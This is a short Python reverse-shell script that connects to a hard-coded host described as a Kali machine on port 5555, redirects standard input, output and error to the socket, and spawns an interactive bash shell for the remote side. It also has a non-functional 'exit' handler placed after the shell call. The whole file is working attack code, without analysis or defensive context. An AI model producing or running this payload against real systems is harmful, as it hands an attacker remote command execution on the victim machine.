import socket
import os
import pty

kali_ip = "192.168.181.134"  
port = 5555

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Kali machine
s.connect((kali_ip, port))

# Duplicate socket file descriptors for STDIN, STDOUT, and STDERR
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Function to check for "&" command to close the connection
def check_exit():
    while True:
        command = s.recv(1024).decode().strip()
        if command == "&":
            break
        else:
            # Send command to be executed on the shell
            s.sendall(command.encode() + b'\n')

# Spawn a new shell using a pseudo-terminal
pty.spawn("/bin/bash")

# Check for exit command
check_exit()

# Close the connection when "&" is entered
s.close()
